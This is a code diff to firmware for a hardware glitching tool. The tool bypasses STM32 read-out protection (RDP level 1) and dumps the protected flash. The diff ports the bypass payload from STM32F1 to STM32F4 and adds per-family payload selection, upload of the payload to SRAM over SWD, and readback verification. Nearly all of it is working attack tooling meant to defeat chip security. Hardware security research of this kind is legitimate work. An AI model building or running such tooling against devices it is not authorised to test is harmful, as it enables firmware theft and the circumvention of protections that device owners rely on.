@@ -211,6 +211,11 @@ static const uint8_t f103_rdp_bypass_payload[] = {
 // Same as above but stage 2 sends register diagnostics before flash dump
 // Protocol: "RDP1" + CPUID(4B) + "DIAG" + 7 regs(28B) + flash bytes
 // Regs: DHCSR, DEMCR, FP_CTRL, FP_COMP0, VTOR, FLASH_OBR, RCC_CSR
+// STM32F4 RDP1 BYPASS payload — F4-specific port of the F1 bypass payload
+// (F4 peripheral map + FPB reader trick for flash reads). Same launch contract
+// and host protocol, so target_power_bypass() drives it via the descriptor below.
+#include "../stm32_payloads/f4/rdp_bypass_f4_hex.h"
+
 #include "../stm32_payloads/f1/rdp_bypass_diag_hex.h"
 #include "../stm32_payloads/f1/rdp_literal_hex.h"
 #include "../stm32_payloads/f1/rdp_regdump_hex.h"
@@ -2497,6 +2502,41 @@ void target_power_payload(float voltage, uint32_t max_attempts) {
     }
 }
 
+// ---------------------------------------------------------------------------
+// Per-family BYPASS payload selection.
+//
+// The BYPASS payload is self-contained: after the POR glitch SRAM-boots it,
+// stage 1 configures the FPB itself, so the host only needs the payload bytes
+// and the SRAM load base. Each family provides its own payload with the correct
+// peripheral map (and, for F4, the FPB reader trick that F1 doesn't need).
+typedef struct {
+    const uint8_t *payload;
+    uint32_t       size;
+    uint32_t       load_base;  // SWD upload address == the payload's link base
+} rdp_bypass_payload_t;
+
+// Defined later in this file.
+extern target_type_t target_get_type(void);
+
+// Returns the per-family BYPASS payload, or NULL if the family has no port yet.
+static const rdp_bypass_payload_t *get_rdp_bypass_payload(target_type_t type) {
+    static const rdp_bypass_payload_t f1_bp = {
+        .payload   = f103_rdp_bypass_payload,
+        .size      = sizeof(f103_rdp_bypass_payload),
+        .load_base = 0x20000000,
+    };
+    static const rdp_bypass_payload_t f4_bp = {
+        .payload   = f4_rdp_bypass_payload,
+        .size      = sizeof(f4_rdp_bypass_payload),
+        .load_base = 0x20000000,   // SRAM-boot alias base; see rdp_bypass.S
+    };
+    switch (type) {
+        case TARGET_STM32F1: return &f1_bp;
+        case TARGET_STM32F4: return &f4_bp;
+        default:             return NULL;  // F2/F3 not ported yet
+    }
+}
+
 void target_power_bypass(uint32_t max_attempts, uint32_t dump_bytes) {
     if (power_group_glitch_blocked()) return;
     extern bool swd_connect(void);
@@ -2511,6 +2551,15 @@ void target_power_bypass(uint32_t max_attempts, uint32_t dump_bytes) {
     if (!info)
         return;
 
+    // Select the per-family BYPASS payload before doing anything (so an
+    // unported family fails loudly instead of running a sweep / glitch).
+    const rdp_bypass_payload_t *bp = get_rdp_bypass_payload(target_get_type());
+    if (!bp) {
+        uart_cli_printf("ERROR: No BYPASS payload for %s — only STM32F1 and STM32F4 are ported\r\n",
+                        info->name);
+        return;
+    }
+
     if (!sweep_calibrated) {
         uart_cli_send("No sweep calibration — running SWEEP first...\r\n\r\n");
         target_power_sweep();
@@ -2521,8 +2570,8 @@ void target_power_bypass(uint32_t max_attempts, uint32_t dump_bytes) {
         uart_cli_send("\r\nSweep complete, continuing with BYPASS...\r\n\r\n");
     }
 
-    uint32_t sram_base = info->sram_base;
-    uint32_t payload_words = (sizeof(f103_rdp_bypass_payload) + 3) / 4;
+    uint32_t sram_base = bp->load_base;
+    uint32_t payload_words = (bp->size + 3) / 4;
 
     // Default to full flash if no count specified
     if (dump_bytes == 0)
@@ -2530,8 +2579,8 @@ void target_power_bypass(uint32_t max_attempts, uint32_t dump_bytes) {
     // Round up to word boundary
     dump_bytes = (dump_bytes + 3) & ~3u;
 
-    uart_cli_printf("RDP1 bypass: %u byte payload -> 0x%08lX, dumping %lu bytes\r\n",
-                    (unsigned)sizeof(f103_rdp_bypass_payload), sram_base, dump_bytes);
+    uart_cli_printf("RDP1 bypass: %s, %lu byte payload -> 0x%08lX, dumping %lu bytes\r\n",
+                    info->name, bp->size, sram_base, dump_bytes);
     uart_cli_printf("Sweep calibrated threshold: %.2fV\r\n", sweep_optimal_thresh);
 
     // === Step 1: Upload bypass payload to SRAM via SWD ===
@@ -2544,7 +2593,7 @@ void target_power_bypass(uint32_t max_attempts, uint32_t dump_bytes) {
     }
     swd_halt();
 
-    uint32_t written = swd_write_mem(sram_base, (const uint32_t *)f103_rdp_bypass_payload, payload_words);
+    uint32_t written = swd_write_mem(sram_base, (const uint32_t *)bp->payload, payload_words);
     if (written != payload_words) {
         uart_cli_printf("ERROR: SRAM write failed (%lu/%lu words)\r\n", written, payload_words);
         swd_deinit();
@@ -2554,7 +2603,7 @@ void target_power_bypass(uint32_t max_attempts, uint32_t dump_bytes) {
     // Verify write
     uint32_t readback[payload_words];
     uint32_t nread = swd_read_mem(sram_base, readback, payload_words);
-    if (nread != payload_words || memcmp(readback, f103_rdp_bypass_payload, sizeof(f103_rdp_bypass_payload)) != 0) {
+    if (nread != payload_words || memcmp(readback, bp->payload, bp->size) != 0) {
         uart_cli_send("ERROR: SRAM verify failed\r\n");
         swd_deinit();
         return;
